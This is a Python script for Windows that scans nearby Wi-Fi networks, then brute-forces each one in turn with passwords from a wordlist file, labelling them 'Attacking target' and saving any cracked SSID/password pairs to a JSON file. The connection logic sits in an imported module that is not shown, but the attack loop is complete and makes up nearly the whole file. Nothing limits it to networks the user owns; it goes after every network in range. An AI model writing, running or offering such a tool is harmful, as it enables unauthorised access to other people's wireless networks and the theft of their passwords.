import subprocess
import re
import time
import pywifi
import winsound
from colorama import Fore, Style, just_fix_windows_console
from connect import Connect

x = Connect()

def scan_wifi_windows() -> list[dict]:
    proc = subprocess.run(
        "chcp 65001 > nul && netsh wlan show networks mode=bssid",
        shell=True,
        capture_output=True
    )
    output = proc.stdout.decode("utf-8", errors="ignore")

    networks = []
    current_net = None

    for line in output.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue

        key, val = [part.strip() for part in line.split(":", 1)]
        if re.match(r"^SSID \d+$", key):
            if current_net and current_net["ssid"]:
                networks.append(current_net)
            current_net = {"ssid": val, "signal": "?", "auth": "?"}

        elif current_net is not None:
            if re.match(r"^\d+%$", val):
                current_net["signal"] = val
            elif any(w in val.upper() for w in ["WPA", "WEP", "OPEN", "ОТКРЫТАЯ", "SAE"]):
                if current_net["auth"] == "?":
                    current_net["auth"] = val

    if current_net and current_net["ssid"]:
        networks.append(current_net)
    return networks


if __name__ == "__main__":
    x.enable_windows_location()
    saved_nets = x._json_reader()
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    just_fix_windows_console()

    print(f"Adapter: {Fore.LIGHTRED_EX}{iface.name()}{Style.RESET_ALL}\n")

    print(f"{Fore.LIGHTCYAN_EX}Scanning wifi networks...{Style.RESET_ALL}")
    nets = scan_wifi_windows()

    print("\nAvailable networks:")
    for net in nets:
        print(f" - SSID: {net['ssid']:<15} | Signal: {net['signal']:<6} | Defence type: {net['auth']}")

    print("-" * 65)
    pass_codes = x._reader_pass()

    if not pass_codes:
        print("[!] File passwords.txt empty or not exists!")
        exit()

    print(f"{Fore.GREEN}[+] Loaded passwords: {len(pass_codes)}{Style.RESET_ALL}\n")

    for net in nets:
        ssid = net["ssid"]
        print(
            f"{Fore.RED}[*] Attacking target:{Style.RESET_ALL} {Fore.LIGHTBLUE_EX}{ssid}{Style.RESET_ALL} {Fore.CYAN}[Defence: {net['auth']}]{Style.RESET_ALL}")

        if ssid in saved_nets:
            continue

        found = False
        for i, code in enumerate(pass_codes, 1):
            status_code = x._connect_to_wifi(iface, net["ssid"], password=code, auth_type=net["auth"])

            if status_code == 200:
                print(
                    f"{Fore.GREEN}[OK] Successfully connected to {net['ssid']}! Password:{Style.RESET_ALL} {Fore.MAGENTA}[{code}]{Style.RESET_ALL}")
                try:
                    x._json_writer({ssid: code})
                    saved_nets[ssid] = code
                except AttributeError:
                    pass
                winsound.Beep(1100, 300)
                winsound.Beep(1300, 500)
                winsound.Beep(1100, 300)
                winsound.Beep(1800, 700)
                found = True
                break
            else:
                print(f"  {Fore.YELLOW}[{i}/{len(pass_codes)}] Failed pass: {code}{Style.RESET_ALL}", end="\r")

        if not found:
            print(f"\n{Fore.LIGHTRED_EX}[ERROR] Unable to connect to {net['ssid']}.{Style.RESET_ALL}")
            winsound.Beep(1000, 300)
            winsound.Beep(800, 300)
            winsound.Beep(600, 300)
            winsound.Beep(400, 300)
        print()
    time.sleep(3)